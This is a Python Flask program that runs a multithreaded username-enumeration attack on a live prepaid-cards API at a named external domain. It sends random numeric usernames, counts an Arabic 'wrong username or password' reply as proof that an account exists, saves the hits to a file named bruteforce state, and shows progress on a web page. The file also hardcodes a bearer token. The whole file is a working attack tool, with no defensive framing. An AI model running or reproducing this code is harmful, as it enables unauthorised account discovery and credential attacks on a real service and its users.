from flask import Flask, render_template, request, jsonify
import json
import os
import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
import threading

app = Flask('app')

# Global variables to track progress
current_step = "Initializing"
valid_usernames = []
total_usernames = 0
processed_usernames = 0

def load_state():
    if os.path.exists('bruteforce_state.json'):
        with open('bruteforce_state.json', 'r') as f:
            state = json.load(f)
            return state.get("valid_usernames", []), state.get("tried_passwords", {})
    return [], {}

def save_state(valid_usernames, tried_passwords):
    serializable_tried_passwords = {k: list(v) for k, v in tried_passwords.items()}
    state = {"valid_usernames": valid_usernames, "tried_passwords": serializable_tried_passwords}
    with open('bruteforce_state.json', 'w') as f:
        json.dump(state, f, indent=4)

def send_request(payload):
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Authorization": "Bearer 1|qkzMyzrJjNKSekHzcmL9QIT80pZsHRJLFp9EWyE198d26f1d",
        "Accept-Language": "ar"
    }
    try:
        response = requests.post("https://bc.red-radius.com/api/v1/prepaid-cards", 
                               json=payload, 
                               headers=headers)
        return response.json(), payload
    except Exception as e:
        return {"error": str(e)}, payload

def check_usernames():
    global current_step, valid_usernames, total_usernames, processed_usernames

    existing_usernames, tried_passwords = load_state()
    if existing_usernames:
        valid_usernames = existing_usernames
        current_step = f"Loaded {len(existing_usernames)} existing usernames"
        return

    current_step = "Scanning usernames"
    prefix = "20"
    usernames_to_test = 1000
    total_usernames = usernames_to_test

    usernames = [f"{prefix}{random.randint(100000, 999999)}" for _ in range(usernames_to_test)]
    payloads = [{"username": u} for u in usernames]

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = []
        for payload in payloads:
            try:
                futures.append(executor.submit(send_request, payload))
            except RuntimeError as e:
                time.sleep(1)

        for future in as_completed(futures):
            try:
                result, payload = future.result()
                processed_usernames += 1
                if result.get("message") == "خطأ في إسم المستخدم أو كلمة المرور":
                    valid_usernames.append(payload["username"])
            except Exception as e:
                continue

    save_state(valid_usernames, {})
    current_step = f"Found {len(valid_usernames)} valid usernames"

def background_process():
    while True:
        try:
            check_usernames()
            time.sleep(5)
        except Exception as e:
            current_step = f"Error: {str(e)}"
            time.sleep(5)

@app.route('/')
def home():
    progress = 0 if total_usernames == 0 else (processed_usernames / total_usernames) * 100
    return render_template(
        'index.html',
        current_step=current_step,
        valid_usernames=valid_usernames,
        progress=progress
    )

@app.route('/status')
def status():
    return jsonify({
        'current_step': current_step,
        'valid_usernames': valid_usernames,
        'progress': 0 if total_usernames == 0 else (processed_usernames / total_usernames) * 100
    })

if __name__ == '__main__':
    # Start background process
    bg_thread = threading.Thread(target=background_process, daemon=True)
    bg_thread.start()

    # Run Flask app
    app.run(host='0.0.0.0', port=5000)